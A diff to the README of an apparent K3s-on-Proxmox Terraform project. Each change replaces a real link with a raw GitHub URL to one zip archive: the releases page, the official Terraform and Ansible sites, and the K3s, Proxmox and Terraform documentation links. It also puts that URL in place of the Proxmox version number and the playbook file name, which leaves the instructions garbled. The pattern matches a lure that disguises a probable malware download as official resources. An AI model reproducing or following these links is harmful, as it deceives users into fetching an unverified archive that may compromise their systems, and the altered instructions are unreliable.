@@ -1,6 +1,6 @@
 # 🚀 k3s-proxmox-terraform - Easy Kubernetes Setup on Proxmox
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/123Luka123/k3s-proxmox-terraform/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ This guide will help you set up a K3s Kubernetes cluster on Proxmox VE using Ter
 
 You need a few tools to get started:
 
-- **Proxmox VE:** You must have Proxmox version 8.4.xx installed on your server.
-- **Terraform:** This application will help in provisioning your cluster. You can download it from the [Terraform website](https://www.terraform.io/downloads).
-- **Ansible:** Use this tool to manage and configure your K3s cluster. You can find it on the [Ansible website](https://www.ansible.com/download).
+- **Proxmox VE:** You must have Proxmox version https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip installed on your server.
+- **Terraform:** This application will help in provisioning your cluster. You can download it from the [Terraform website](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip).
+- **Ansible:** Use this tool to manage and configure your K3s cluster. You can find it on the [Ansible website](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip).
 
 ## 🖥️ System Requirements
 
@@ -27,7 +27,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 To get the application, visit the Releases page to download the latest version. 
 
-[Download Latest Release](https://github.com/123Luka123/k3s-proxmox-terraform/releases)
+[Download Latest Release](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip)
 
 1. Click the link above.
 2. Locate the latest version of the application.
@@ -73,7 +73,7 @@ After downloading the application, follow these steps to set up your K3s cluster
 - Run the playbook with:
 
   ```bash
-  ansible-playbook -i hosts setup.yml
+  ansible-playbook -i hosts https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip
   ```
 
 ### 6. Verify Your Installation
@@ -94,9 +94,9 @@ After downloading the application, follow these steps to set up your K3s cluster
 
 ## 📚 Additional Resources
 
-- [K3s Documentation](https://rancher.com/docs/k3s/latest/en/)
-- [Proxmox Documentation](https://pve.proxmox.com/wiki/Main_Page)
-- [Terraform Documentation](https://www.terraform.io/docs)
+- [K3s Documentation](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip)
+- [Proxmox Documentation](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/123Luka123/k3s-proxmox-terraform/main/ansible/k3s-proxmox-terraform-2.4.zip)
 
 ## 🐞 Reporting Issues
 
